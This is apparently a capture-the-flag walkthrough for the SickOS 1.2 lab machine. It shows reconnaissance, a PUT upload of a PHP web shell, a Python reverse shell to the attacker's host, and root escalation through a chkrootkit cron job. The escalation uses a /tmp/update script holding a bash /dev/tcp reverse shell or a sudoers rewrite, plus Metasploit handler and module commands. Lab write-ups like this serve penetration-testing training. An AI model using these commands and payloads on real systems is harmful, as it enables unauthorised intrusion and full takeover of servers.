# SickOS 1.2

![](https://i.imgur.com/1JR58TI.png)
Host is `192.168.227.132`
![](https://i.imgur.com/Sawv9BK.png)
Victim is `192.168.227.134`
`nmap -sS -sV -p- -oN NampSickOsLv2.txt 192.168.227.134`
![](https://i.imgur.com/GB8p98k.png)
Here we got two port open: OpenSSH 5.9p1/22, lighttpd 1.4.28/80

Let's take a look the website on 80, there might contain ssh AC/PW.
![](https://i.imgur.com/jREPFjX.png)
Well, nice meme. Is there any metadata or message stego in the pic?

![](https://i.imgur.com/Pe3Y4Qg.png)
exiftool... Nope.

![](https://i.imgur.com/oeI9r8O.png)
binwalk... Nope.
strings either.
Maybe we need dive more deeper.

![](https://i.imgur.com/NkkWjTW.png)
`dirb http://192.168.227.134` then we got `/test` here.
![](https://i.imgur.com/2AQdZPl.png)
Seems a directories leaking.

Can we upload file to it?
`curl -v -X OPTIONS http://192.168.227.134/test/`
![](https://i.imgur.com/7ov6RPQ.png)

Now find a short reverse shell payload to upload:
`curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://192.168.227.134/test/shell.php`
![](https://i.imgur.com/xMmGNMi.png)
![](https://i.imgur.com/MiGumz1.png)
Success!
This payload may allow us to execute more complicated command through `GET` variable `cmd`.
Let's give it simple test with `id`.
```
http://192.168.227.134/test/shell.php?cmd=id
```
![](https://i.imgur.com/dZPtTz7.png)

Great. Let's try a little bit more complicated payload.

![](https://i.imgur.com/pOwsy2F.png)
`http://192.168.227.134/test/shell.php?cmd=uname -a`


```
http://192.168.227.134/test/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.227.132",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
Okay, we try so hard, there's only 443 work, and else was blocked.

![](https://i.imgur.com/EqFboKM.png)
As usual, setup pty: `python -c 'import pty;pty.spawn("/bin/bash")'`
If you want a proper fitty terminal, open `nc` with bash.
After get shell and type python pty, `CTRL+Z` suspended the process.
Check terminal environment info with `echo $TERM`, `stty -a`.
Set the stty to type raw: `stty raw -echo`.
Bring the shell back with `fg`, and reset it.
![](https://i.imgur.com/9qfpBGu.png)
This might give you a greate teerminal to interact.

![](https://i.imgur.com/ohr3P0Q.png)
We search the `crontab` in `/etc`, found that there're `cron.daily`, `cron.weekly`, `cron.monthly` will be run as root.

Go deeper inside...
```
cd /etc/cron.daily
ls -alF
chkrootkit -V
```
![](https://i.imgur.com/K8TRQgI.png)

We got some version number here, `searchsploit` of this.
![](https://i.imgur.com/Y5EDDRx.png)

Here's local privilege escalation.
![](https://i.imgur.com/lknfFmq.png)

That mean let's set a reverse shell file name as `update` under `/tmp` them we will get `root` shell, like this:

```
# On Victim
printf '#!/bin/bash\nbash -i >& /dev/tcp/192.168.216.129/443 0>&1\n' >> /tmp/update
chmod 777 /tmp/update
```
```
# On Host
nc -nlvp 443
```

Or simply set a shell script to add yourself as super user / unlimit the protect of sudoers:
```
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
![](https://i.imgur.com/0TGJd38.png)

![](https://i.imgur.com/KefsPJr.png)
However, this payload didn't work, so I turn out to use metasploit.

## Msfconsole

From PentestMonkey, get the php reverse shell, save it and upload to the `192.168.227.134/test/`
```
curl --upload-file php-reverse-shell.txt -v http://192.168.227.134/test/php-reverse-shell.php -O --http1.0
```
Then open up the MSF, create the session handler.
```
use exploit/multi/handler
set lport 443
set payload linux/x86/shell_reverse_tcp
set lhost 192.168.227.132
run
```
Start using exploit module on session.
```
se exploit/unix/local/chkrootkit
set SESSION 1
set LHOST 192.168.227.132
set LPORT 443
run
```
![](https://i.imgur.com/yzlIM4V.png)

Get root shell and cat the flag. 
![](https://i.imgur.com/9pjCAiC.png)
